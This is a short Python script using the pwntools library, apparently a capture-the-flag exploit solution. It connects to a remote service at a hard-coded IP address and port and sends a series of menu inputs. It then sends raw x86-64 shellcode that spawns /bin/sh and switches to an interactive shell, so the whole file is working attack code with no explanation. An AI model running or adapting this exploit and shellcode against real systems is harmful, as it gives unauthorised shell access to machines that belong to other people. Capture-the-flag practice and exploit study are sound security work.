from pwn import *

r=remote("3.93.128.89",1206)
r.sendline("3")

r.sendline("460")
r.sendline("7")

r.sendline("1973")
r.sendline("82")

r.sendline("1974")
r.sendline("195")
print(r.recv())

shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
r.sendline(shellcode)
r.interactive()


